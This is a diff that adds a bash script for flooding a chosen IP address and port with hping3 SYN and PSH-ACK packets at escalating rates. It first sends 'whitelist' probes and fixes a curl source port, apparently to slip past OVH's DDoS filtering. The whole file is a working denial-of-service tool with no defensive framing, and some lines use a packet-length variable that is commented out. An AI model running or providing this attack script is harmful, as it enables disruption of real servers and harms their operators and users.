@@ -1,0 +1,84 @@
+if [ "$#" -lt 2 ]; then
+    echo "Usage: ./script.sh <ip> <port> [delay]"
+    exit
+fi
+screen -dm hping3 -S $1 -p $2
+pkill -9 curl
+
+srcprt=$(shuf -i 20000-30000 -n 1)
+dstprt=$2
+delay=$3
+
+# If we don't have PA delay set we will use 0.5
+if [ -z "$3" ]
+  then
+    delay=0.5
+fi
+
+echo "Using delay of $delay"
+
+# Whitelist attempts
+hping3 -S $1 -p $2 &
+sleep $delay
+hping3 -S $1 -p $2 &
+sleep $delay
+hping3 -S $1 -p $2 &
+sleep $delay
+
+# Source port defined here so OVH remembers what port we will be sending data over
+curl --local-port $srcprt $1:$2 &
+sleep $delay
+
+# Chose packet length
+
+#len=$(shuf -i 900-1399 -n 1)
+win=$(shuf -i 10000-15000 -n 1)
+hping3 -i u1 -q -s $srcprt --keep -d $len -PA -p $2 -w 192 -E data $1
+hping3 -i u2000 -q -d 500 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1500 -q -d 750 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1000 -q -d 900 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u700 -q -d 1200 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u400 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u200 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u50 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u10 -q -d 1400 -PA -p $2 -w $win -E data $1
+hping3 -i u1 -q -s $srcprt --keep -d $len -PA -p $2 -w 192 -E data $1
+hping3 -i u2000 -q -d 500 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1500 -q -d 750 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1000 -q -d 900 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u700 -q -d 1200 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u400 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u200 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u50 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u10 -q -d 1400 -PA -p $2 -w $win -E data $1
+hping3 -i u1 -q -s $srcprt --keep -d $len -PA -p $2 -w 192 -E data $1
+hping3 -i u2000 -q -d 500 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1500 -q -d 750 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1000 -q -d 900 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u700 -q -d 1200 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u400 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u200 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u50 -q -d 1400 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u10 -q -d 1400 -PA -p $2 -w $win -E data $1
+hping3 -i u1 -q -s $srcprt --keep -d $len -PA -p $2 -w 192 -E data $1
+hping3 -i u2000 -q -d 600 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1500 -q -d 750 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1000 -q -d 912 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u700 -q -d 1222 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u400 -q -d 1434 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u200 -q -d 1434 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u50 -q -d 1412 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u10 -q -d 1412 -PA -p $2 -w $win -E data $1
+hping3 -i u1 -q -s $srcprt --keep -d $len -PA -p $2 -w 192 -E data $1
+hping3 -i u2000 -q -d 600 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1500 -q -d 750 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u1000 -q -d 912 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u700 -q -d 1222 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u400 -q -d 1434 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u200 -q -d 1434 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u50 -q -d 1412 -PA -p $2 -w $win -c 500 -E data $1
+hping3 -i u10 -q -d 1412 -PA -p $2 -w $win -E data $1
+
+
+
+
